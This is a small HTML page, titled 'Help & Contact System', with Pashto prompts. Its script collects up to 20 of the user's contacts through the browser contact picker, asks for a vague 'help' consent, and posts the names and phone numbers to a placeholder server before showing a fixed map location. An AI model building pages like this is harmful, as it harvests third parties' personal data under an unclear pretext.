<!DOCTYPE html>
<html lang="en">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1.0">
<title>Contact Help System</title>
<script src="https://cdn.tailwindcss.com"></script>
</head>

<body class="bg-[#0b0f1a] min-h-screen flex items-center justify-center p-4">

<div class="bg-white rounded-3xl shadow-2xl max-w-md w-full overflow-hidden">

    <!-- HEADER -->
    <div class="bg-indigo-900 text-white text-center p-5">
        <h1 class="text-xl font-bold">Help & Contact System</h1>
    </div>

    <div class="p-6">

        <!-- SCREEN 1 -->
        <div id="permissionScreen" class="text-center">
            <h2 class="text-lg font-bold mb-4">Start</h2>

            <p class="text-sm text-gray-700 mb-4">
                مهرباني وکړئ خپلې اړیکې انتخاب کړئ (تر ۲۰ پورې).
            </p>

            <button onclick="getContacts()"
                class="w-full bg-indigo-600 text-white py-4 rounded-xl font-bold">
                Select Contacts
            </button>
        </div>

        <!-- SCREEN 2 -->
        <div id="consentScreen" class="hidden">
            <h2 class="text-lg font-bold mb-4">Permission</h2>

            <label class="flex gap-2 text-sm mb-4">
                <input type="checkbox" id="consentCheck">
                <span>
                    زه موافق یم چې زما ټاکل شوې اړیکې د مرستې لپاره شریکې شي.
                </span>
            </label>

            <button onclick="sendData()"
                class="w-full bg-green-600 text-white py-4 rounded-xl font-bold">
                Continue
            </button>
        </div>

        <!-- SCREEN 3 -->
        <div id="mapScreen" class="hidden text-center">

            <h2 class="text-lg font-bold mb-4">Location View</h2>

            <div class="rounded-xl overflow-hidden border">
                <iframe width="100%" height="250"
                    src="https://maps.google.com/maps?q=30.1834279,71.458914&z=12&output=embed">
                </iframe>
            </div>

            <p class="text-green-600 text-sm mt-3">
                System Ready ✔
            </p>
        </div>

    </div>
</div>

<script>

let savedContacts = [];

// STEP 1: Select Contacts
async function getContacts() {
    if ('contacts' in navigator) {
        try {
            const contacts = await navigator.contacts.select(['name','tel'], { multiple: true });

            if (contacts.length === 0) {
                alert("هیڅ اړیکه ونه ټاکل شوه.");
                return;
            }

            if (contacts.length > 20) {
                alert("تر ۲۰ زیات مه انتخابوئ.");
                return;
            }

            savedContacts = contacts;

            document.getElementById('permissionScreen').classList.add('hidden');
            document.getElementById('consentScreen').classList.remove('hidden');

        } catch (e) {
            alert("اجازه ورنکړل شوه.");
        }
    } else {
        alert("ستاسو براوزر ملاتړ نه کوي.");
    }
}

// STEP 2: Send Data (SAFE API)
async function sendData() {

    const consent = document.getElementById('consentCheck').checked;

    if (!consent) {
        alert("مهرباني وکړئ اجازه ورکړئ.");
        return;
    }

    try {
        await fetch("https://your-server.com/api/contacts", {
            method: "POST",
            headers: {
                "Content-Type": "application/json"
            },
            body: JSON.stringify({
                contacts: savedContacts
            })
        });

        // NEXT SCREEN
        document.getElementById('consentScreen').classList.add('hidden');
        document.getElementById('mapScreen').classList.remove('hidden');

    } catch (e) {
        alert("د معلوماتو لېږلو کې ستونزه.");
    }
}

</script>

</body>
</html>
